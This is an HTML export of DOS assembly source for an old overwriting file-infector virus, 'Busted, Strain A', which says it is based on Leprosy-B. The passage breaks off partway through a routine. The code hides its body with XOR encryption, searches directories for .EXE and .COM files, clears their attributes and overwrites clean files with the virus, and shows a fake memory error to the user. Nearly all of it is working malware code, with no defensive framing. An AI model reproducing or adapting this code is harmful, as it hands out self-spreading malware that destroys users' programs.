<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">cr</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">              </span><span class="sc1">;  Carriage return ASCII code</span><span class="sc0">
</span><span class="sc5">lf</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">              </span><span class="sc1">;  Linefeed ASCII code</span><span class="sc0">
</span><span class="sc5">tab</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">9</span><span class="sc0">               </span><span class="sc1">;  Tab ASCII code</span><span class="sc0">
</span><span class="sc5">code_start</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">            </span><span class="sc1">;  Address right after PSP in memory</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc0">             </span><span class="sc1">;  Addr of default disk transfer area</span><span class="sc0">
</span><span class="sc5">datestamp</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">24</span><span class="sc0">              </span><span class="sc1">;  Offset in DTA of file's date stamp</span><span class="sc0">
</span><span class="sc5">timestamp</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">22</span><span class="sc0">              </span><span class="sc1">;  Offset in DTA of file's time stamp</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">30</span><span class="sc0">              </span><span class="sc1">;  Offset in DTA of ASCIIZ filename</span><span class="sc0">
</span><span class="sc5">attribute</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">              </span><span class="sc1">;  Offset in DTA of file attribute</span><span class="sc0">


        </span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">          </span><span class="sc1">;  Open code segment</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">         </span><span class="sc1">;  One segment for both code &amp; data</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc5">code_start</span><span class="sc0">      </span><span class="sc1">;  Start code image after PSP</span><span class="sc0">

</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  All executable code is contained in boundaries of procedure "main".</span><span class="sc0">
</span><span class="sc1">;  The following code, until the start of "virus_code", is the non-</span><span class="sc0">
</span><span class="sc1">;  encrypted CMT portion of the code to load up the real program.</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;  Code execution begins here</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_decrypt</span><span class="sc0">         </span><span class="sc1">;  Decrypt the real virus code</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">random_mutation</span><span class="sc0">         </span><span class="sc1">;  Put the virus into action</span><span class="sc0">

</span><span class="sc5">encrypt_val1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">;  Hold value to encrypt by here</span><span class="sc0">
</span><span class="sc5">encrypt_val2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; ----------  Encrypt, save, and restore the virus code  -----------</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">handle</span><span class="sc0">               </span><span class="sc1">;  Get the handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;  Save it on the stack</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_decrypt</span><span class="sc0">         </span><span class="sc1">;  Encrypt most of the code</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;  Get back the handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endvir</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc0">          </span><span class="sc1">;  Total number of bytes to write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">code_start</span><span class="sc0">           </span><span class="sc1">;  Buffer where code starts in memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;  DOS write-to-handle service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;  Write the virus code into the file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_decrypt</span><span class="sc0">         </span><span class="sc1">;  Restore the code as it was</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;  Go back to where you came from</span><span class="sc0">

</span><span class="sc1">; ---------------  Encrypt or decrypt the code  ----------------</span><span class="sc0">
</span><span class="sc5">encrypt_decrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_code</span><span class="sc0">    </span><span class="sc1">;  Get address to start encrypt/decrypt</span><span class="sc0">
</span><span class="sc5">xor_loop</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;  Start cycle here</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;  Get the current byte</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">encrypt_val1</span><span class="sc0">         </span><span class="sc1">;  Engage/disengage XOR scheme on it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">;  Put it back where we got it</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;  Move BX ahead a byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_code</span><span class="sc4">+(</span><span class="sc5">endvir</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;  Are we at the end?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">xor_nd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">encrypt_val2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_code</span><span class="sc4">+(</span><span class="sc5">endvir</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">xor_loop</span><span class="sc0">                </span><span class="sc1">;  If not, do another cycle</span><span class="sc0">
</span><span class="sc5">xor_nd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;  and go back where we came from</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;   The rest of the code from here on remains encrypted until run-time,</span><span class="sc0">
</span><span class="sc1">;   using a fundamental XOR technique that changes via CMT.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">virus_code</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;  All strings are kept here in the file, and automatically encrypted.</span><span class="sc0">
</span><span class="sc1">;  Please don't be a lamer and change the strings and say you wrote a virus.</span><span class="sc0">
</span><span class="sc1">;  Because of Cybernetic Mutation Technology(tm), the CRC of this file often</span><span class="sc0">
</span><span class="sc1">;  changes, even when the strings stay the same.</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">exe_filespec</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">com_filespec</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"*.COM"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">newdir</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fake_msg</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc3">"Program too big to fit in memory$"</span><span class="sc0">
</span><span class="sc5">virus_msg</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">cr</span><span class="sc4">,</span><span class="sc5">lf</span><span class="sc4">,</span><span class="sc5">tab</span><span class="sc4">,</span><span class="sc3">"Busted!$"</span><span class="sc0">
</span><span class="sc5">virus_info</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"This is based on Leprosy-B.  Thanx PCM2"</span><span class="sc0">
</span><span class="sc5">viral_tag</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Busted, Strain A, version 1.0"</span><span class="sc0">
</span><span class="sc5">viral_tag_2</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"By ˜€×@&amp;î·³½$ (Psychogenius), September '91"</span><span class="sc0">
</span><span class="sc5">compare_buf</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;  Buffer to compare files in</span><span class="sc0">
</span><span class="sc5">files_found</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">files_infected</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">orig_time</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">orig_date</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">orig_attr</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">handle</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">success</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">random_mutation</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">; First decide if virus is to mutate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                  </span><span class="sc1">; Set up DOS function to get time</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">encrypt_val1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; Is this a first-run virus copy?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">install_val</span><span class="sc0">             </span><span class="sc1">; If so, install whatever you get.</span><span class="sc0">
</span><span class="sc5">install_val</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Will we be encrypting using zero?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">random_mutation</span><span class="sc0">         </span><span class="sc1">; If so, get a new value.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encrypt_val1</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">         </span><span class="sc1">; Otherwise, save the new value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">encrypt_val2</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc5">find_extension</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Locate file w/ valid extension</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">files_found</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Count infected files found</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">files_infected</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; BX counts file infected so far</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">success</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">find_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100111b</span><span class="sc0">            </span><span class="sc1">; Look for all flat file attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe_filespec</span><span class="sc0">  </span><span class="sc1">; Check for .EXE extension first</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                  </span><span class="sc1">; Call DOS find first service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                  </span><span class="sc1">; Are no files found?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">find_com</span><span class="sc0">                </span><span class="sc1">; If not, nothing more to do</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_healthy</span><span class="sc0">            </span><span class="sc1">; Otherwise, try to find healthy .EXE</span><span class="sc0">
</span><span class="sc5">find_com</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100111b</span><span class="sc0">            </span><span class="sc1">; Look for all flat file attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_filespec</span><span class="sc0">  </span><span class="sc1">; Check for .COM extension now</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">                  </span><span class="sc1">; Call DOS find first service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                  </span><span class="sc1">; Are no files found?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chdir</span><span class="sc0">                   </span><span class="sc1">; If not, step back a directory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_healthy</span><span class="sc0">            </span><span class="sc1">; Otherwise, try to find healthy .COM</span><span class="sc0">
</span><span class="sc5">chdir</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; Routine to step back one level</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newdir</span><span class="sc0">        </span><span class="sc1">; Load DX with address of pathname</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                  </span><span class="sc1">; Change directory DOS service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">files_infected</span><span class="sc0">          </span><span class="sc1">; This counts as infecting a file</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">find_exe</span><span class="sc0">                </span><span class="sc1">; If we're still rolling, find another</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_virus</span><span class="sc0">              </span><span class="sc1">; Otherwise let's pack it up</span><span class="sc0">
</span><span class="sc5">find_healthy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc0">                  </span><span class="sc1">; Point BX to address of DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]+</span><span class="sc5">attribute</span><span class="sc0">       </span><span class="sc1">; Get the current file's attribute</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">orig_attr</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]+</span><span class="sc5">timestamp</span><span class="sc0">       </span><span class="sc1">; Get the current file's time stamp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">orig_time</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]+</span><span class="sc5">datestamp</span><span class="sc0">       </span><span class="sc1">; Get the current file's data stamp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">orig_date</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Save it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc0">         </span><span class="sc1">; Get the filename to change attribute</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Clear all attribute bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; Set attribute sub-function</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                  </span><span class="sc1">; Call DOS service to do it</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; Set up to open handle for read/write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                  </span><span class="sc1">; Open file handle DOS service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; Save the file handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Transfer the handle to BX for read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                   </span><span class="sc1">; Read in the top 20 bytes of file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">compare_buf</span><span class="sc0">   </span><span class="sc1">; Use the small buffer up top</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; DOS read-from-handle service</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">compare_buf</span><span class="sc0">   </span><span class="sc1">; Adjust the encryption value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">encrypt_val1</span><span class="sc0">         </span><span class="sc1">; for accurate comparison</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">code_start</span><span class="sc0">           </span><span class="sc1">; One array to compare is this file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">compare_buf</span><span class="sc0">   </span><span class="sc1">; The other array is the buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">; Transfer the DS register...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ...to the ES register</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">; Compare the buffer to the virus</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">healthy</span><span class="sc0">                 </span><span class="sc1">; If different, the file is healthy!</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">; Close it up otherwise</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">files_found</span><span class="sc0">             </span><span class="sc1">; Chalk up another fucked up file</span><span class="sc0">
</span><span class="sc5">continue_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                  </span><span class="sc1">; Find next DOS function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; Try to find another same type file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">                  </span><span class="sc1">; Are there any more files?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_more_found</span><span class="sc0">           </span><span class="sc1">; If not, get outta here</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_healthy</span><span class="sc0">            </span><span class="sc1">; If so, try the process on this one!</span><span class="sc0">
</span><span class="sc5">no_more_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Go back to where we came from</span><span class="sc0">
</span><span class="sc5">healthy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">handle</span><span class="sc0">               </span><span class="sc1">; Get the file handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                  </span><span class="sc1">; Close it for now</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                  </span><span class="sc1">; Open it again, to reset it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; Save the handle again</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">             </span><span class="sc1">; Infect the healthy file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">              </span><span class="sc1">; Close down this operation</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">success</span><span class="sc0">                 </span><span class="sc1">; Indicate we did something this time</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">files_infected</span><span class="sc0">          </span><span class="sc1">; Scratch off another file on agenda</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_virus</span><span class="sc0">              </span><span class="sc1">; If we're through, terminate</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">continue_search</span><span class="sc0">         </span><span class="sc1">; Otherwise, try another</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">handle</span><span class="sc0">               </span><span class="sc1">; Get the file handle off the stack</span><span class="sc0">
